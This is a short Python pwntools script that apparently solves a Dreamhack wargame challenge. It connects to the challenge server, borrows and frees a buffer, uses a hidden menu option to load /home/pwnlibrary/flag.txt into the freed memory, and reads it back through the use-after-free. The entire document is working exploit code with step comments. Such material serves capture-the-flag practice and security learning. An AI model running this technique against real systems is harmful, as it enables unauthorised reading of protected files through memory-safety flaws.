from pwn import *

port = 14166
rem = remote("host3.dreamhack.games", port)

# malloc 0x100
rem.sendlineafter(b"menu : ", b"1")
rem.sendlineafter(b"borrow? : ", b"1")

# free
rem.sendlineafter(b"menu : ", b"3")

# get flag to freed space
rem.sendlineafter(b"menu : ", b"275")
rem.sendlineafter(b"book? : ", b"/home/pwnlibrary/flag.txt")
rem.sendlineafter(b"(MAX 400) : ", b"256")

# read the freed space
rem.sendlineafter(b"menu : ", b"2")
rem.sendlineafter(b"read? : ", b"0")

rem.recvline()
print(rem.recvline().rstrip())